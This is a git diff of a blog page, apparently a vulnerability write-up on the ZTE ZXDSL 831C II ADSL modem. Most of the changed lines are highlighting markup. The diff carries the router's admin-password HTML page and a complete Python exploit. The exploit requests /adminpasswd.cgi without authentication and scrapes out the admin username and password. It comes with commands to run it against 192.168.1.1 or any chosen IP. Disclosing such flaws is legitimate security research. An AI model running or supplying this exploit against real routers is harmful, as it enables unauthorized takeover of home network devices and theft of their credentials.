+</span></span><span class="line"><span class="cl">        <span class="nb">eval</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">--&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span> <span class="na">onLoad</span><span class="o">=</span><span class="s">&#39;frmLoad()&#39;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">strong</span><span class="p">&gt;</span>Admin Account<span class="p">&lt;/</span><span class="nt">strong</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="nt">BR</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">BR</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">TABLE</span> <span class="na">cellSpacing</span><span class="o">=</span><span class="s">&#34;0&#34;</span> <span class="na">cellPadding</span><span class="o">=</span><span class="s">&#34;0&#34;</span> <span class="na">border</span><span class="o">=</span><span class="s">&#34;0&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">TBODY</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">TR</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">TD</span> <span class="na">width</span><span class="o">=</span><span class="s">&#34;590&#34;</span><span class="p">&gt;</span>Admin account has unrestricted access to change and view configuration of your ADSL<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span> router. <span class="p">&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">TR</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">TBODY</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">TABLE</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">BR</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">TABLE</span> <span class="na">cellSpacing</span><span class="o">=</span><span class="s">&#34;0&#34;</span> <span class="na">cellPadding</span><span class="o">=</span><span class="s">&#34;0&#34;</span> <span class="na">border</span><span class="o">=</span><span class="s">&#34;0&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">TBODY</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">TR</span> <span class="na">height</span><span class="o">=</span><span class="s">&#34;30&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">TD</span> <span class="na">width</span><span class="o">=</span><span class="s">&#34;150&#34;</span><span class="p">&gt;</span>User Name:<span class="p">&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">TD</span><span class="p">&gt;&lt;</span><span class="nt">INPUT</span> <span class="na">maxLength</span><span class="o">=</span><span class="s">&#34;63&#34;</span>  <span class="na">size</span><span class="o">=</span><span class="s">&#34;30&#34;</span>   <span class="na">name</span><span class="o">=</span><span class="s">&#34;sysUserName&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">TR</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">TR</span> <span class="na">height</span><span class="o">=</span><span class="s">&#34;30&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">TD</span><span class="p">&gt;</span>New Password:<span class="p">&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">TD</span><span class="p">&gt;&lt;</span><span class="nt">INPUT</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">maxLength</span><span class="o">=</span><span class="s">&#34;32&#34;</span> <span class="na">size</span><span class="o">=</span><span class="s">&#34;30&#34;</span>  <span class="na">name</span><span class="o">=</span><span class="s">&#34;sysPassword&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">TR</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">TR</span> <span class="na">height</span><span class="o">=</span><span class="s">&#34;30&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">TD</span><span class="p">&gt;</span>Confirm New Password:<span class="p">&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">TD</span><span class="p">&gt;&lt;</span><span class="nt">INPUT</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">maxLength</span><span class="o">=</span><span class="s">&#34;32&#34;</span> <span class="na">size</span><span class="o">=</span><span class="s">&#34;30&#34;</span>  <span class="na">name</span><span class="o">=</span><span class="s">&#34;cfmPwd&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">TR</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">TBODY</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">TABLE</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">BR</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">TABLE</span> <span class="na">width</span><span class="o">=</span><span class="s">&#34;500&#34;</span> <span class="na">border</span><span class="o">=</span><span class="s">&#34;0&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">TBODY</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">TR</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">TD</span> <span class="na">align</span><span class="o">=</span><span class="s">&#34;left&#34;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#34;494&#34;</span><span class="p">&gt;&lt;</span><span class="nt">INPUT</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;button&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;button&#34;</span> <span class="na">onClick</span><span class="o">=</span><span class="s">&#34;btnApplyAdmin()&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Apply&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">TR</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">TBODY</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">TABLE</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>This is the page used by the router to change the username and password to access the router.
 The one I showed you earlier.</p>
@@ -541,48 +541,48 @@ snatch the username and password.</p>
 </span><span class="lnt">41
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
-
-<span class="c1"># This script extracts the Username and Password of the `ZTE - ZXDSL 831C II` </span>
-<span class="c1"># modem. </span>
-
-<span class="c1"># This script can only be used on a system you have the authority to </span>
-<span class="c1"># execute such scripts on. If you did this attack on a system you don&#39;t </span>
-<span class="c1"># have authority on I&#39;m not held responsible. Do so on your own risk.</span>
-
-<span class="c1"># author: Omer Abdulaziz</span>
-<span class="c1"># email: omerabdi@pm.me</span>
-
-<span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">re</span>
-
-<span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;192.168.1.1&#34;</span>
-
-<span class="k">try</span><span class="p">:</span>
-    <span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-<span class="k">except</span><span class="p">:</span>
-    <span class="k">pass</span>
-
-<span class="k">try</span><span class="p">:</span>
-    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Attacking </span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s2"> ...&#34;</span><span class="p">)</span>
-    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s2">/adminpasswd.cgi&#34;</span><span class="p">)</span>
-<span class="k">except</span><span class="p">:</span>
-    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Network error&#34;</span><span class="p">)</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
-
-<span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
-    <span class="n">userna</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;nameAdmin = &#39;.*&#39;&#34;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
-    <span class="n">passwd</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;pwdAdmin = &#39;.*&#39;&#34;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
-
-    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[=] Username: </span><span class="si">{</span><span class="n">userna</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[=] Password: </span><span class="si">{</span><span class="n">passwd</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
-
-<span class="k">else</span><span class="p">:</span>
-    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] It appears the target is not vulnerable&#34;</span><span class="p">)</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># This script extracts the Username and Password of the `ZTE - ZXDSL 831C II` </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># modem. </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># This script can only be used on a system you have the authority to </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># execute such scripts on. If you did this attack on a system you don&#39;t </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># have authority on I&#39;m not held responsible. Do so on your own risk.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># author: Omer Abdulaziz</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># email: omerabdi@pm.me</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;192.168.1.1&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Attacking </span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s2"> ...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s2">/adminpasswd.cgi&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Network error&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">userna</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;nameAdmin = &#39;.*&#39;&#34;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">passwd</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;pwdAdmin = &#39;.*&#39;&#34;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[=] Username: </span><span class="si">{</span><span class="n">userna</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[=] Password: </span><span class="si">{</span><span class="n">passwd</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] It appears the target is not vulnerable&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Running the script. The script runs on the <code>192.168.1.1</code> target by default, but you can
 change by supplying the target of your choice.</p>
@@ -594,11 +594,11 @@ change by supplying the target of your choice.</p>
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python exp.py
-
-<span class="c1"># or give it any other target</span>
-python exp.py 10.0.0.1
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python exp.py
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># or give it any other target</span>
+</span></span><span class="line"><span class="cl">python exp.py 10.0.0.1
+</span></span></code></pre></td></tr></table>
 </div>
 </div><figure><img src="./pic/2021-01-04_20-18.png"/><figcaption>
             <h4>Running the exploit</h4>
@@ -634,8 +634,8 @@ python exp.py 10.0.0.1
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.87.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
-                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Omer</a></span></div>
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.96.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Omer</a></span></div>
         </div>
     </footer></div>
 
@@ -644,5 +644,5 @@ python exp.py 10.0.0.1
             </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                 <i class="fas fa-comment fa-fw"></i>
             </a>
-        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
 </html>
